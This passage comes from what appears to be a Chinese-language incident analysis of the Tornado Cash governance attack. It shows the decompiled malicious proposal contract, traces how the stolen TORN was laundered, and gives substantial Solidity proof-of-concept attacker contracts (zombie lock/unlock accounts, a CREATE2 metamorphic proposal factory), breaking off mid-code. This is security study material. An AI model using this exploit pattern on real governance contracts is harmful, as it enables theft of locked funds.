+<h3 id="5-执行资金盗取"><a href="#5-执行资金盗取" class="headerlink" title="5. 执行资金盗取"></a>5. 执行资金盗取</h3><p>这一步的攻击提案合约地址为：<a class="link"   target="_blank" rel="noopener" href="https://etherscan.io/address/0x592340957ebc9e4afb0e9af221d06fdddf789de9" >0x592340957eBC9e4Afb0E9Af221d06fDDDF789de9<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>decompile出的攻击提案合约代码：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">abstract contract Ownable &#123;</span><br><span class="line">    address private _owner;</span><br><span class="line"></span><br><span class="line">    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        _transferOwnership(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        _checkOwner();</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function owner() public view virtual returns (address) &#123; find similar</span><br><span class="line">        return _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _checkOwner() internal view virtual &#123;</span><br><span class="line">        require(owner() == msg.sender, &quot;Ownable: caller is not the owner&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transferOwnership(address newOwner) internal virtual &#123;</span><br><span class="line">        address oldOwner = _owner;</span><br><span class="line">        _owner = newOwner;</span><br><span class="line">        emit OwnershipTransferred(oldOwner, newOwner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;./Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IRelayerRegistry &#123;</span><br><span class="line">    function getRelayerBalance(address relayer) external view returns (uint256); find similar</span><br><span class="line"></span><br><span class="line">    function nullifyBalance(address relayer) external; find similar</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IStakingRewards &#123;</span><br><span class="line">    function withdrawTorn(uint256 amount) external; find similar</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Proposal is Ownable &#123;</span><br><span class="line">    function getNullifiedTotal(address[4] memory relayers) public view returns (uint256) &#123; find similar</span><br><span class="line">        uint256 nullifiedTotal;</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line"></span><br><span class="line">        for (uint8 x = 0; x &lt; relayers.length; x++) &#123;</span><br><span class="line">            nullifiedTotal += IRelayerRegistry(_registryAddress).getRelayerBalance(relayers[x]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return nullifiedTotal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeProposal() external &#123; find similar</span><br><span class="line">        address[4] memory VIOLATING_RELAYERS = [</span><br><span class="line">            0xcBD78860218160F4b463612f30806807Fe6E804C, // thornadope.eth</span><br><span class="line">            0x94596B6A626392F5D972D6CC4D929a42c2f0008c, // 0xgm777.eth</span><br><span class="line">            0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4, // 0xtorn365.eth</span><br><span class="line">            0x18F516dD6D5F46b2875Fd822B994081274be2a8b // abc321.eth</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        uint256 NULLIFIED_TOTAL_AMOUNT = getNullifiedTotal(VIOLATING_RELAYERS);</span><br><span class="line"></span><br><span class="line">        address _registryAddress = 0x58E8dCC13BE9780fC42E8723D8EaD4CF46943dF2;</span><br><span class="line">        address _stakingAddress = 0x2FC93484614a34f26F7970CBB94615bA109BB4bf;</span><br><span class="line"></span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[0]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[1]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[2]);</span><br><span class="line">        IRelayerRegistry(_registryAddress).nullifyBalance(VIOLATING_RELAYERS[3]);</span><br><span class="line"></span><br><span class="line">        IStakingRewards(_stakingAddress).withdrawTorn(NULLIFIED_TOTAL_AMOUNT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyStop() public onlyOwner &#123; find similar</span><br><span class="line">        selfdestruct(payable(0));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中使用的接口具体实现为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">   * @notice This function should allow governance to nullify a relayers balance</span><br><span class="line">   * @dev IMPORTANT FUNCTION:</span><br><span class="line">   *      - Should nullify the balance</span><br><span class="line">   *      - Adding nullified balance as rewards was refactored to allow for the flexibility of these funds (for gov to operate with them)</span><br><span class="line">   * @param relayer address of relayer who&#x27;s balance is to nullify</span><br><span class="line">   * */</span><br><span class="line">  function nullifyBalance(address relayer) external onlyGovernance &#123;</span><br><span class="line">    address masterAddress = workers[relayer];</span><br><span class="line">    require(relayer == masterAddress, &quot;must be master&quot;);</span><br><span class="line">    relayers[masterAddress].balance = 0;</span><br><span class="line">    emit RelayerBalanceNullified(relayer);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @notice This function should allow governance rescue tokens from the staking rewards contract</span><br><span class="line">   * */</span><br><span class="line">  function withdrawTorn(uint256 amount) external onlyGovernance &#123;</span><br><span class="line">    if (amount == type(uint256).max) amount = torn.balanceOf(address(this));</span><br><span class="line">    torn.safeTransfer(address(Governance), amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>在攻击提案合约中，攻击者硬编码了4个受害relayer的地址，先是通过<code>getNullifiedTotal()</code> 函数算出了四个relayer质押的balance总额，然后调用<code>nullifyBalance()</code> 来清除掉relayer对质押balance的claim权，注意relayer的balance并不在relayer自己的账户地址上，而是在Relayer Registry合约账户上。</li>
+<li>提案合约随后调用<code>withdrawTorn()</code> 将位于registry中的代币<code>safeTransfer()</code>到Governance合约中，方便后续混币</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%201.png"
+                      alt="image 1.png"
+                ></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://app.blocksec.com/explorer/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=68" >转账交易链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<hr>
+<h2 id="四、攻击后资金的流转路径"><a href="#四、攻击后资金的流转路径" class="headerlink" title="四、攻击后资金的流转路径"></a>四、攻击后资金的流转路径</h2><h3 id="变现操作"><a href="#变现操作" class="headerlink" title="变现操作"></a>变现操作</h3><ul>
+<li>攻击者将僵尸合约的balance解锁，并提取到自己的合约提走攻击473000TORN</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%202.png"
+                      alt="image 2.png"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%203.png"
+                      alt="image 3.png"
+                ></p>
+<ul>
+<li>攻击者将其中 100,000 枚 TORN 换为约 54 ETH。</li>
+<li>随后，通过 Tornado Cash 的 ETH 混币合约，将 372 ETH 存入混币池。</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/image%204.png"
+                      alt="image 4.png"
+                ></p>
+<hr>
+<h2 id="五、POC"><a href="#五、POC" class="headerlink" title="五、POC"></a>五、POC</h2><h3 id="AttackerContracts1-sol"><a href="#AttackerContracts1-sol" class="headerlink" title="AttackerContracts1.sol"></a>AttackerContracts1.sol</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;Ownable&#125; from &quot;./AttackerOwnable.sol&quot;;</span><br><span class="line">import &quot;./TornadoGovernance_rep.interface.sol&quot;;</span><br><span class="line">import &#123;IERC20&#125; from &quot;../../interfaces/IERC20.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attacker1Contract &#123;</span><br><span class="line">    IERC20 TORN = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);</span><br><span class="line">    address[] internal _zombieContracts;</span><br><span class="line"></span><br><span class="line">    function getZombieAccounts() public view returns (address[] memory) &#123;</span><br><span class="line">        return _zombieContracts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Deploy zombie accounts</span><br><span class="line">    function deployMultipleContracts(uint256 amount) external &#123;</span><br><span class="line">        address newZombie;</span><br><span class="line">        for (uint256 i = 0; i &lt; amount;) &#123;</span><br><span class="line">            newZombie = address(new Zombie(msg.sender));</span><br><span class="line">            console2.log(&quot;Deploying and preparing zombie #%s at address: %s&quot;, i + 1, newZombie);</span><br><span class="line"></span><br><span class="line">            _zombieContracts.push(newZombie);</span><br><span class="line"></span><br><span class="line">            // The following steps were performed by the attacker but are not necessary for the attack</span><br><span class="line">            // The attack works if the next lines are commented.</span><br><span class="line">            TORN.transferFrom(msg.sender, newZombie, 0);</span><br><span class="line">            Zombie(newZombie).attackTornado(Zombie.AttackInstruction.APPROVE);</span><br><span class="line">            Zombie(newZombie).attackTornado(Zombie.AttackInstruction.LOCK);</span><br><span class="line"></span><br><span class="line">            unchecked &#123;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Unlock and withdraw assets from the zombie account</span><br><span class="line">    function triggerUnlock() external &#123;</span><br><span class="line">        uint256 amountOfZombies = _zombieContracts.length;</span><br><span class="line">        for (uint256 i = 0; i &lt; amountOfZombies;) &#123;</span><br><span class="line">            address currentZombie = _zombieContracts[i];</span><br><span class="line">            Zombie(currentZombie).attackTornado(Zombie.AttackInstruction.UNLOCK);</span><br><span class="line">            Zombie(currentZombie).attackTornado(Zombie.AttackInstruction.TRANSFER);</span><br><span class="line"></span><br><span class="line">            unchecked &#123;</span><br><span class="line">                ++i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Each Zombie implementation</span><br><span class="line">contract Zombie &#123;</span><br><span class="line">    enum AttackInstruction &#123;</span><br><span class="line">        APPROVE,</span><br><span class="line">        LOCK,</span><br><span class="line">        UNLOCK,</span><br><span class="line">        TRANSFER</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IERC20 TORN = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);</span><br><span class="line">    ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // this function has the signature 0x93d3a7b6 on each Zombie contract</span><br><span class="line">    // The attacker implemented this method so it uses target.call(payload) and had two parameters:</span><br><span class="line">    // something like: 0x93d3a7b6(address target, bytes memory payload);</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    function 0x93d3a7b6(address target, bytes memory payload) external &#123;</span><br><span class="line">        (bool success, ) = target.call(payload);</span><br><span class="line">        require(success);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line">    // We show this implementation to show each step clearly</span><br><span class="line">    function attackTornado(AttackInstruction instruction) external &#123;</span><br><span class="line">        if (instruction == AttackInstruction.APPROVE) &#123;</span><br><span class="line">            TORN.approve(address(TORNADO_GOVERNANCE), 0);</span><br><span class="line">        &#125; else if (instruction == AttackInstruction.LOCK) &#123;</span><br><span class="line">            TORNADO_GOVERNANCE.lockWithApproval(0);</span><br><span class="line">        &#125; else if (instruction == AttackInstruction.UNLOCK) &#123;</span><br><span class="line">            TORNADO_GOVERNANCE.unlock(10_000 ether); // 10000000000000000000000</span><br><span class="line">        &#125; else if (instruction == AttackInstruction.TRANSFER) &#123;</span><br><span class="line">            TORN.transfer(owner, 10_000 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="AttackerContracts2-sol"><a href="#AttackerContracts2-sol" class="headerlink" title="AttackerContracts2.sol"></a>AttackerContracts2.sol</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &#123;Ownable&#125; from &quot;./AttackerOwnable.sol&quot;;</span><br><span class="line">import &quot;./TornadoGovernance_rep.interface.sol&quot;;</span><br><span class="line">import &#123;IERC20&#125; from &quot;../../interfaces/IERC20.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MetaDeployer is Ownable &#123;</span><br><span class="line">    address public proposalAddr;</span><br><span class="line">    address public proposalFactoryAddress;</span><br><span class="line">    bool public deployMaliciousProposal;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Modifier to ensure that the first 20 bytes of a submitted salt match</span><br><span class="line">     * those of the calling account. This provides protection against the salt</span><br><span class="line">     * being stolen by frontrunners or other attackers.</span><br><span class="line">     * @param salt bytes32 The salt value to check against the calling address.</span><br><span class="line">     */</span><br><span class="line"></span><br><span class="line">    modifier containsCaller(bytes32 salt) &#123;</span><br><span class="line">        require(</span><br><span class="line">            address(bytes20(salt)) == msg.sender,</span><br><span class="line">            &quot;Invalid salt - first 20 bytes of the salt must match calling address.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // This function implements the logic behind the deployment for a proposal via a factory</span><br><span class="line">    // contract</span><br><span class="line">    // First, the factory contract is deployed with Create2 and then the latter deploys the</span><br><span class="line">    // proposal with Create    </span><br><span class="line">    // More details:</span><br><span class="line">    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&amp;debugLine=0</span><br><span class="line">    // Method called after: 0xce40d339 in the attacker&#x27;s contract factory</span><br><span class="line"></span><br><span class="line">    function createProposalWithFactory(bytes32 _salt, bool _deployMaliciousProposal)</span><br><span class="line">        public</span><br><span class="line">        payable</span><br><span class="line">        containsCaller(_salt)</span><br><span class="line">        returns (address proposalContractAddress, address FactoryRealAddr)</span><br><span class="line">    &#123; </span><br><span class="line">        //write the global variable</span><br><span class="line">        deployMaliciousProposal = _deployMaliciousProposal;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // determine the address of the transient contract.</span><br><span class="line">        address factoryAddressBycalc = getFactoryAddress(_salt);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //create the factory</span><br><span class="line">        FactoryRealAddr = address(new FactoryContract&#123;salt: _salt&#125;());</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            FactoryRealAddr == factoryAddressBycalc,</span><br><span class="line">            &quot;Failed to deploy transient contract using given salt and init code.&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        proposalContractAddress = _getProposalAddress(factoryAddressBycalc);</span><br><span class="line">        proposalAddr = proposalContractAddress;</span><br><span class="line">        proposalFactoryAddress = FactoryRealAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Precompute with create2</span><br><span class="line">    function getFactoryAddress(bytes32 salt) public view returns (address) &#123;</span><br><span class="line">        return address(</span><br><span class="line">            uint160(</span><br><span class="line">                uint256(</span><br><span class="line">                    keccak256(</span><br><span class="line">                        abi.encodePacked(</span><br><span class="line">                            hex&quot;ff&quot;,</span><br><span class="line">                            address(this),</span><br><span class="line">                            salt,</span><br><span class="line">                            keccak256(type(FactoryContract).creationCode)</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function _getProposalAddress(address factoryAddressBycalc) internal pure returns (address)&#123;</span><br><span class="line">        return address(</span><br><span class="line">            uint160(</span><br><span class="line">                uint256(</span><br><span class="line">                    keccak256(</span><br><span class="line">                        abi.encodePacked(</span><br><span class="line">                            bytes1(0xd6),</span><br><span class="line">                            bytes1(0x94),</span><br><span class="line">                            factoryAddressBycalc,</span><br><span class="line">                            bytes1(0x01)</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function emergencyStop() external onlyOwner &#123;</span><br><span class="line">        console2.log(&quot;Triggering destruction of factory and proposal...&quot;);</span><br><span class="line">        FactoryContract(proposalFactoryAddress).emergencyStop();</span><br><span class="line">        console2.log(&quot;Factory and proposal destroyed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FactoryContract is Ownable&#123;</span><br><span class="line">    // The owner of this contract will be the metaDeployer</span><br><span class="line">    </span><br><span class="line">    address public metaDeployerAddr;</span><br><span class="line">    address public proposalAddr;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">        metaDeployerAddr = msg.sender;</span><br><span class="line"></span><br><span class="line">        //transfer ownership to the metaDeployer</span><br><span class="line">        _transferOwnership(metaDeployerAddr);</span><br><span class="line"></span><br><span class="line">        //  deploy the proposal</span><br><span class="line">        address proposalContractAddr;</span><br><span class="line">        bool deployMaliciousProposal = IMetaDeployer(msg.sender).deployMaliciousProposal();</span><br><span class="line"></span><br><span class="line">        